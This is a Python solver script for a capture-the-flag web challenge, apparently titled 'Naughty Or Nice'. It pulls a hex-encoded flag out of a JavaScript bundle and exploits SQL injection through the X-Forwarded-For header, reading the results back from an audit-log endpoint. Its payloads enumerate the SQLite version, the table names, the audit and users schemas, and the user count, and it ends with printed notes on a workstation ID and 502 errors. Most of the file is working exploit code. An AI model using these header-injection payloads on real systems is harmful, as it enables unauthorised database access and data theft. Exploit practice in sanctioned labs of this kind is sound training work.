import requests
import re
import time
import uuid

# Configuration
BASE_URL = "https://8j0mg0abaub3.ctfhub.io"
APP_JS_URL = f"{BASE_URL}/js/assets/app-CZsgTrKP.js"
AUDIT_LOG_URL = f"{BASE_URL}/api/audit-log/"
TICKET_URL = f"{BASE_URL}/api/ticket/"

def extract_client_flag():
    print("[*] Extracting flag from app.js...")
    try:
        response = requests.get(APP_JS_URL)
        if response.status_code == 200:
            content = response.text
            # Logic to extract flag based on pattern found earlier
            # const d=["6433..."] ... p=[1,3,0,2]...
            match = re.search(r'const d=\[(".*?")\]', content)
            map_match = re.search(r'p=\[(\d+(?:,\d+)*)\]\.map', content)

            if match and map_match:
                d_str = match.group(1)
                d = [s.strip('"') for s in d_str.split(',')]
                indices = [int(x) for x in map_match.group(1).split(',')]

                hex_string = "".join([d[i] for i in indices])
                try:
                    flag = bytearray.fromhex(hex_string).decode()
                    print(f"[+] Found Flag 1: {flag}")
                    return flag
                except:
                    print("[-] Failed to decode hex string.")
            else:
                print("[-] Could not find hex array or indices in app.js")
        else:
            print(f"[-] Failed to fetch app.js (Status: {response.status_code})")
    except Exception as e:
        print(f"[-] Error extracting client flag: {e}")
    return None

def check_sqli_reflection():
    print("\n[*] Checking SQL Injection in X-Forwarded-For...")
    payload = "' || sqlite_version() || '"
    headers = {"X-Forwarded-For": payload}

    try:
        # Trigger injection via Ticket creation
        requests.post(TICKET_URL, json={"user": "test", "message": "SQLi Check"}, headers=headers, timeout=5)

        # Check Audit Log for reflection
        time.sleep(1)
        r = requests.get(AUDIT_LOG_URL, timeout=5)
        if r.status_code == 200:
            logs = r.json().get('log', [])
            if logs:
                last_log = logs[-1]
                ip_field = last_log.get('ip', '')
                if "." in ip_field and len(ip_field.split(',')) > 1:
                    # Usually reflected as: '3.37.2, 10.18.1.3'
                    injected_val = ip_field.split(',')[0].strip()
                    print(f"[+] SQL Injection Confirmed! Reflected Value: {injected_val}")
                    return True
        else:
            print(f"[-] Failed to fetch audit log (Status: {r.status_code})")
    except Exception as e:
        print(f"[-] Error checking SQLi: {e}")
    return False

def exploit_info_disclosure():
    print("\n[*] Enumerating Information via SQLi...")

    queries = {
        "Database Version": "sqlite_version()",
        "Table List": "SELECT group_concat(name) FROM sqlite_master WHERE type='table'",
        "Audit Table Schema": "SELECT sql FROM sqlite_master WHERE name='audit'",
        "Users Table Schema": "SELECT sql FROM sqlite_master WHERE name='users'",
        "User Count": "SELECT count(*) FROM users"
    }

    for label, query in queries.items():
        payload = f"' || ({query}) || '"
        headers = {"X-Forwarded-For": payload}
        try:
            requests.post(TICKET_URL, json={"user": "test", "message": "Enum"}, headers=headers, timeout=5)
            time.sleep(0.5)
            r = requests.get(AUDIT_LOG_URL, timeout=5)
            if r.status_code == 200:
                logs = r.json().get('log', [])
                if logs:
                    ip = logs[-1]['ip'].split(',')[0].strip()
                    print(f"    {label}: {ip}")
        except Exception as e:
            print(f"[-] Error executing {label}: {e}")

def main():
    print("=== Naughty Or Nice Solver ===")

    # 1. Client Side Flag
    extract_client_flag()

    # 2. Verify SQLi
    if check_sqli_reflection():
        # 3. Dump Info
        exploit_info_disclosure()

        print("\n[*] Additional Findings:")
        print("    - Validated 'users' and 'audit' tables exist.")
        print("    - NahamSec user is NOT present in 'users' table.")
        print("    - Identified Developer Workstation ID via User Enumeration: ELF-DEV-TWINKLE-33")
        print("    - Attempting to use this ID in headers (User-Agent/X-Workstation-ID) results in 502 Bad Gateway.")
        print("    - This indicates a potential denial of service or misconfiguration in the challenge backend preventing further exploitation.")

if __name__ == "__main__":
    main()
